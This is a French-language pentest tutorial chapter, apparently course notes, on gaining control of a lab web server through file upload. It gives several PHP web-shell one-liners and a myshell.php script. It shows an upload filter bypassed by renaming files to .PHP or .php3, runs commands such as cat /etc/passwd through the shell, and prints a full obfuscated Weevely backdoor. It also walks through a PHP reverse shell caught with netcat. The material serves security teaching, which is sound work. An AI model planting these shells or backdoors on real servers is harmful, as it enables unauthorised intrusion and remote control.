# 5. Web Shell

Un **code encoquillé** \(en Anglais web shell\) est une interface de type shell Web malveillante qui permet un accès et un contrôle à distance à un serveur Web en permettant l'exécution de commandes arbitraires.

```text
# Execute one command
<?php system("whoami"); ?>

# Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>

# The same but using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?>

# Exec() does not output the result without echo, and only output the last line. So not very useful!
<?php echo exec("whoami");?>

# Instead to this if you can. It will return the output as an array, and then print it all.
<?php exec("ls -la",$array); print_r($array); ?>

# preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks
<?php echo `whoami`; ?>
```

Maintenant que nous connaissons le mot de passe de l'admin nous pouvons nous connecter à l'interface de management des images du site pour y déposer un script php.

![](https://lh5.googleusercontent.com/QV2Q2-R_heHH89G7BglUyIEq3FvWoSzDAMS4swWOMcMQh6NWVTlaP5BhNOOH7wCVMvlZr_2Sm7ZZLiIV2roOdqBmMlUX1Sq9EpIswMf0H6mo_2GZ3GLY7HUos8EGNbPkLy-TZRvF)

![](https://lh5.googleusercontent.com/qcwb1xbur2PRCIBoOMwGg7vs1qrGdNgiu8EieNASoqzRaTmkQ-kwKx-Mv143SPlUe9186jd4UdUJiubwoEbEJVdSpsulNnT1dW4EaJQsk3sSGx09UicdPNV6n8jE8s8hoRwmvqvv)

Création d'un script **myshell.php** permettant d'exécuter des commande shell sur une machine.

```text
<?php
  system($_GET['cmd']);
?>  
```

Essayons de télécharger le script **myshell.php** sur le serveur en passant l'interface de management des images.

![](https://lh4.googleusercontent.com/rgVWBHSZt8yig0Su8vLFcMW-5wmFyoLLsdnLLUSC3Rwrtg_-XVkI_OT5bu14-ds4OmdlQh9KNevseWuiYq7yTL63qO79A8pH1NYo6c0tpMqRYssEiVjquODhV8_9ivwMchgOYHC8)

{% hint style="info" %}
Le site n'autorise pas le téléchargement de fichier PHP
{% endhint %}

![](https://lh5.googleusercontent.com/ORAUqtYxLgdwGfNtoTX0OVtH1MtT40X47LCXtGoId6nBVHz7ThSYE_pmtKDUgZnsdXuXMsrpAePj5IWXCn8HOzUq7fvnJWPPe1AI_siYQ-vD02OSx7_B-9qFjJ_oXr64s5cgkDH_)

Nous pouvons essayer de contourner cette sécurité en renommant le fichier \(Linux est sensible à la case\)

![](https://lh5.googleusercontent.com/iGYURs7TdRw3rVhKQPuQx0cfTvA-BjhOARy98QRWKsN_QXCPSVvjQis1b-1xh9zJcXel1kCAXOc9TpdF0fXG7K0wyjaBtR88c_y3yKmAA9Okr_ecxm6IdTuepnQPiZAR8qdx-N93)

![](https://lh5.googleusercontent.com/zIgUlwS4UjqVbWLiE2MSxk22Sif80IJ6res4rLxuOafrW6lEAPsie0yLdFnJAwhlPUQFMcuFUBBIW7pzvzQhnc9jhXCf7j7KXsH_zuF6b1Wn4bRkQiqDJdNvHsYOC6h0bY6ekwP3)

![](https://lh6.googleusercontent.com/Biz1nU852Rdfw5OwB4YxzmlAl9-lncqaytFJu3sSjx7AWYwD3w5SzPxSPburaItJW8YUTwIuKeDEHIX9lrNDrF2Z4a-TJeiRc05HveXdtRrFD90pd0fUFxr0BatPyKnI4OrkhYud)

Le script PHP **myshell.php** est à présent sur le serveur. En étudiant rapidement le code source de la page on arrive facilement à trouver le chemin pour pouvoir l'exécuter.

![](https://lh3.googleusercontent.com/S8mi83S4QgPCocfjdIA3Srl8dYR99-rTkJj3ghJTK4SNVr7ij5k3NrKU2R_joKNdvXis0fU4vv7BN8mr-r2P5adaED1V5jy6YZ-qLRyi5RPo9gyReK412_Q-Fy8E-ku519qTbsnL)

Nous pouvons tester a présent plusieurs combinaisons d'URL pour observer sont fonctionnent sur le serveur

{% embed url="http://192.168.200.128/admin/uploads/myshell.PHP" %}

![](https://lh3.googleusercontent.com/LfGQytEAlBk25ObT-OjAYwJ9h-QKghm_x5hLCRkPj1mpi8XO2EE4uEX2WxabruBGJYsz62iiDGPHSDybTr7wRmfgfUA5CeoODv8Q41RIM-lKc0aEKbKy--85Og7JXTz-1mWiFkAj)

[http://192.168.200.128/admin/uploads/myshell.PHP?cmd=ls](http://192.168.200.128/admin/uploads/myshell.PHP?cmd=ls

)

![](https://lh5.googleusercontent.com/Q6zAe_Z3bGPJfRu4i5gj5ifycZAXWMzyBd_ezdxuA8wJLhsALAgPj_e7V9tOnBT3L7q6Te6ejMD_gY738JJ-kFQHngsqDeBm9ubqQKm94W_ba5ovlA0_4eb0gUe-C9CqwvcvsazQ)

[http://192.168.200.128/admin/uploads/myshell.PHP?cmd=uname -a](http://192.168.200.128/admin/uploads/myshell.PHP?cmd=uname)

![](https://lh6.googleusercontent.com/fARo-VBvpcWJM13zkE7e22Zd7XNqaWNNZRthg9Q7EhAi3HWNJItCXMBGNvX66HsnMS-RMOdydjzE0XTd6a-C_eL8ekHrzO1kiLjne1-S4Ls3YvgOJn1vWShuyJ46zcjTW2JQekX1)

[http://192.168.200.128/admin/uploads/myshell.PHP?cmd=cat /etc/passwd](http://192.168.200.128/admin/uploads/myshell.PHP?cmd=cat)

![](https://lh6.googleusercontent.com/Owl-mHISJHWmBglIg_Gi68UhiVEVxuOY1jr8FuB9vLoDgZs4dRMNBFZ5YfjThjX8PoYWwIzAgy5TDSzsNr18heahSqiATo-7QuLU1lpUxHPXnsqWfbQSGcXNX-G6tjxMMH8USJAE)

### Weevely

**Weevely** est un petit **shell PHP** qui une fois placé sur un serveur, permet de l’administrer via un genre de console Telnet ou SSH. Cet outil peut être aussi bien utilisé dans le cas de pentest que pour de l’admin classique de serveur web. Pour cela, il suffit de générer un petit fichier PHP avec Weevly.

```text
$ sudo apt install weevely
$ weevely generate cpnv shell.php3
Backdoor file 'shell.php3' created with password 'cpnv'
```

```text
$ more shell.php3
```

```text
<?php
$R='(z<$j=0;(z<$j<$cz<&&$z<i<$l);$z<j++z<,$i++){$o.z<z<=$t{$i}^$k{$jz<};}}rz<z<eturn $oz<;}z<z<if (@p';
$N='$k="z<c2326efz<7";$kh=z<"7acfd247z<f2z<44";$z<z<kf="758f8ba3e10fz<";$p=z<"kbSg1X0z<FIMKz<h7LAH";';
$u='ntz<ents();@ob_end_z<clean();$rz<=@base6z<4_enz<coz<z<de(@x(@gzcompz<ress($o),$z<k));z<prz<intz<("$p$kh$r$kf");}';
$G='start()z<z<;@ez<val(@gzuz<ncompress(@z<x(@base6z<4_decoz<de($m[1z<]),z<$k))z<);$o=@ob_gz<et_z<coz<';
$f='fz<unctiz<z<on x($t,$k){$z<c=strz<lenz<($k);$lz<=sz<trlen($t)z<z<;$o="";foz<z<r($i=0;$i<$l;){for';
$a='reg_matcz<h("/$kh(.+)$z<kz<fz</",@file_get_z<contents("pz<hz<p://inz<put"),z<$m)==z<z<1) {@ob_';
$h=str_replace('d','','cdrdeate_dfddunctdion');
$y=str_replace('z<','',$N.$f.$R.$a.$G.$u);
$A=$h('',$y);$A();
?>
```

![](../.gitbook/assets/image%20%2827%29.png)

{% embed url="http://192.168.200.128/admin/uploads/shell.php3" %}

![](../.gitbook/assets/image%20%2824%29.png)

```text
$ weevely http://192.168.200.128/admin/uploads/shell.php3 cpnv
```

![](../.gitbook/assets/image%20%2829%29.png)

### **Reverse-shell**$ weevely [http://192.168.200.128/admin/uploads/shell.php3](http://192.168.200.128/admin/uploads/shell.php3) cpnv

Il convient de clarifier dans un premier temps l’intérêt d’utiliser un **reverse-shell** et ce que c’est. Un **reverse-shell** n’est autre qu’un shell \(terminal/console\) contrôlé à distance par un utilisateur. Un shell simple se traduit par une attente de connexion sur un port précis par la machine à contrôler. L’utilisateur va se connecter sur ce port et récupérer le terminal interactif. Le **reverse-shell** est l’inverse : c’est l’utilisateur qui place un processus en écoute sur un port précis, et c’est la machine à contrôler qui établit la connexion vers la machine de l’utilisateur pour lui transmettre le contrôle de son terminal.

{% hint style="info" %}
L’intérêt du **reverse-shell** ? Plus besoin de se soucier des IPs des machines distantes à contrôler puisque ce sont elles qui se connectent à l’utilisateur. De plus, comme la connexion est sortante à partir de la machine à contrôler, les pare-feux/routeurs bloquent rarement ce type de flux.
{% endhint %}

{% embed url="https://github.com/pentestmonkey/php-reverse-shell/archive/master.zip" %}

Renommez le fichier **php-reverse-shell.php** en fichier **php-reverse-shell.php3** pour contourner la protection interdisant le téléchargement des fichier PHP sur le serveur.

![](https://lh4.googleusercontent.com/Mec_lu-uhwQRZiSlQsIJrB38SL7DaKxxxp_75CEkMHNEChlnY79e7l3eaDXNqyIVV2nI-3b2n8MOliQbizs4O9OR6I4P5FCM31RpQcBMgyC5mZf8c03UcTckV3dy5SIIokiyHaBr)

Modifier le fichier **php-reverse-shell** en indiquant l'adresse IP du client cible et du port à joindre.

![](https://lh4.googleusercontent.com/KIcQ6UwZiyY5yCI3ZtjSr1MWQw2f1TmvPv7hTHk0tUqiTWZQf3ma034kNZw2_obp7kDoVcNolOOr3cj8G2OiSmTMjK4eJC_YVN5KblP7Oz2HGhKaDwU453Zd0kY3g2x4BhnAl57A)

![](https://lh6.googleusercontent.com/-Dh9r_UdrKJUehcm1hIu-nmZMfNaOwC8McMgaGuA3TshxSKr2PlnJrk2t3AmFb_VuiIKoxK8ZKmfvGeOQcs5ep810z6GLFa2QmECOvHerJQko_eGFO9mH7_LHvgePN97E6wuEaYM)

Sur le client cible, lancez une commande netcast en écoute sur le port 1234 défini dans le fichier **php-reverse-shell** 

![](https://lh4.googleusercontent.com/eCaUPjsbnuAzpWWgCbZN6CCPq07_GjCofPKIi6oDAPNv2tjM3nkwTXnckWr8YzdxHBmcFtnmLahvGjwtmWTLr7eI14HtNdV6OSrwkLvBfgBUj4LO2uzslbVeaI2VORnGpCxf7SsX)

{% embed url="http://192.168.200.128/admin/uploads/php-reverse-shell.php3" %}

{% hint style="info" %}
Une fois le lien validé, le script PHP **php-reverse-shell** s'exécute sur le serveur et le client à accès à un shell complet du serveur limité au droit du processus apache.
{% endhint %}

![](https://lh3.googleusercontent.com/zT3VsihBolt7pVvh7rAjeL0sanv0dd0Ypa9GQkkApBPb9DbLDEgGd5XQjqMOi3Ee6iqKFj9yz4U76utontER9cEgffh32ieQCdq-wtjebN4TY4MXW-GiAG8_fo9pWmj5o_-tcsJk)

![](https://lh5.googleusercontent.com/RnenGk2Ji9b40l5jZ1TPpyHyRDeCsB2qvlo9xiyI_sIvFYMJiH4xu96u4ivTPY6ioqA1oVIeSJLrBT0r8UkYHN_-rRUTvQlsNlBkTgZZAgM45P2-QC03epTKKPFdaG9cxKdSA4-Z)

## \*\*\*\*

